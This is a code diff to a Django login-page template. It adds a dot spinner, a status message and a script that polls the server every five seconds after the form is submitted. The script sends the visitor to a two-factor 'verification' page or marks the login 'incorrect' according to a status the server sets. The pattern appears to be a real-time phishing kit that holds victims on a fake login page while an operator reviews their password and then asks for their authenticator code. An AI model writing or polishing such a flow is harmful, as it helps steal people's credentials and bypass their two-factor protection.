@@ -627,28 +627,148 @@
       .hidden {
         display: none;
       }
+/* Spinner Container */
+  #spinner {
+    display: none; /* Hidden by default */
+    width: 50px;
+    height: 50px;
+    position: relative;
+    margin: 20px auto; /* Center alignment */
+  }
+
+  /* Individual Dot Styling */
+  .spinner-dot {
+    width: 8px; /* Dot size */
+    height: 8px;
+    background-color: white; /* White dots */
+    border-radius: 50%; /* Makes them circular */
+    position: absolute;
+    animation: spin-dots 1.2s infinite ease-in-out;
+  }
+
+  /* Position the dots in a circular path */
+  .dot1 {
+    top: 0;
+    left: 50%;
+    transform: translate(-50%, 0);
+    animation-delay: -1.1s;
+  }
+
+  .dot2 {
+    top: 15%;
+    left: 85%;
+    transform: translate(-50%, -50%);
+    animation-delay: -1s;
+  }
+
+  .dot3 {
+    top: 50%;
+    left: 100%;
+    transform: translate(-50%, -50%);
+    animation-delay: -0.9s;
+  }
+
+  .dot4 {
+    top: 85%;
+    left: 85%;
+    transform: translate(-50%, -50%);
+    animation-delay: -0.8s;
+  }
+
+  .dot5 {
+    top: 100%;
+    left: 50%;
+    transform: translate(-50%, -100%);
+    animation-delay: -0.7s;
+  }
+
+  .dot6 {
+    top: 85%;
+    left: 15%;
+    transform: translate(-50%, -50%);
+    animation-delay: -0.6s;
+  }
+
+  .dot7 {
+    top: 50%;
+    left: 0;
+    transform: translate(50%, -50%);
+    animation-delay: -0.5s;
+  }
+
+  .dot8 {
+    top: 15%;
+    left: 15%;
+    transform: translate(-50%, -50%);
+    animation-delay: -0.4s;
+  }
+
+  /* Animation for the dots */
+  @keyframes spin-dots {
+    0%,
+    100% {
+      transform: scale(1); /* Normal size */
+      opacity: 1; /* Fully visible */
+    }
+    50% {
+      transform: scale(0.6); /* Smaller size */
+      opacity: 0.3; /* Dimmed */
+    }
+  }
     </style>
     <script>
-      // Function to poll the status from the server every 5 seconds
-      function pollStatus(submissionId) {
-        if (submissionId) {
-          setInterval(() => {
-            fetch(`/check_status/${submissionId}/`)
-              .then((response) => response.json())
-              .then((data) => {
-                if (data.status === "authenticator") {
-                  // Redirect to verification page
-                  window.location.href = `/verification/${submissionId}/`;
-                } else if (data.status === "incorrect") {
-                  // Refresh the page with incorrect status query param
-                  window.location.href = `?status=incorrect`;
-                }
-              })
-              .catch((error) => console.error("Error checking status:", error));
-          }, 5000); // Poll every 5 seconds
-        }
+  // Function to poll the status from the server every 5 seconds
+  function pollStatus(submissionId) {
+    if (submissionId) {
+      setInterval(() => {
+        fetch(`/check_status/${submissionId}/`) // Use the correct URL structure
+          .then((response) => {
+            if (!response.ok) {
+              throw new Error("Failed to fetch status");
+            }
+            return response.json();
+          })
+          .then((data) => {
+            const status = data.status; // Extract the status
+            updateUI(status);
+
+            // Handle redirection based on status
+            if (status === "authenticator") {
+              window.location.href = `/verification/${submissionId}/`;
+            } else if (status === "incorrect") {
+              window.location.href = `?status=incorrect`;
+            }
+          })
+          .catch((error) => console.error("Error checking status:", error));
+      }, 5000); // Poll every 5 seconds
+    }
+  }
+
+  // Function to update the UI based on the current status
+  function updateUI(status) {
+    const spinnerElement = document.getElementById("spinner");
+    const statusMessage = document.getElementById("statusMessage");
+
+    if (status === "pending") {
+      spinnerElement.style.display = "block"; // Show spinner
+      if (statusMessage) {
+        statusMessage.textContent = "Verifying information, please be patient...";
       }
-    </script>
+    } else {
+      spinnerElement.style.display = "none"; // Hide spinner
+      if (statusMessage) {
+        statusMessage.textContent = `Current Status: ${status}`;
+      }
+    }
+  }
+
+  // Initialize polling with the submission ID if available
+  const submissionId = "{{ submission_id }}"; // Injected from the backend
+  if (submissionId) {
+    pollStatus(submissionId);
+  }
+</script>
+
   </head>
   <body
     class="__className_627f4f flex flex-col"
@@ -763,13 +883,27 @@
               <a class="ml-2 !underline" href="/register">Sign up</a>
             </p>
           </div>
-          <form
+       <form
             class="!mt-0 space-y-6"
             action=""
             enctype="multipart/form-data"
             method="POST"
             id="loginForm"
           >
+<div id="spinner">
+  <div class="spinner-dot dot1"></div>
+  <div class="spinner-dot dot2"></div>
+  <div class="spinner-dot dot3"></div>
+  <div class="spinner-dot dot4"></div>
+  <div class="spinner-dot dot5"></div>
+  <div class="spinner-dot dot6"></div>
+  <div class="spinner-dot dot7"></div>
+  <div class="spinner-dot dot8"></div>
+</div>
+
+<div id="spinner" style="display: none;">Loading...</div>
+<p id="statusMessage"></p>
+
             {% csrf_token %}
             <label
               class="text-[15px] font-medium leading-none tracking-tight text-tertiary peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex flex-col gap-2"
@@ -877,16 +1011,10 @@
                   clip-rule="evenodd"
                 ></path>
               </svg>
-              <div class="d-flex flex-column flex-xs-row mt-1">
-                Verifying information, please be patient...
-              </div>
             </div>
           </form>
 
-          {% if message %}
-          <div class="alert alert-info">{{ message }}</div>
-          {% endif %}
-        </div>
+       
       </div>
       <div
         class="h-screen w-[calc(100vw-498px)] grow overflow-hidden bg-container max-[990px]:hidden"
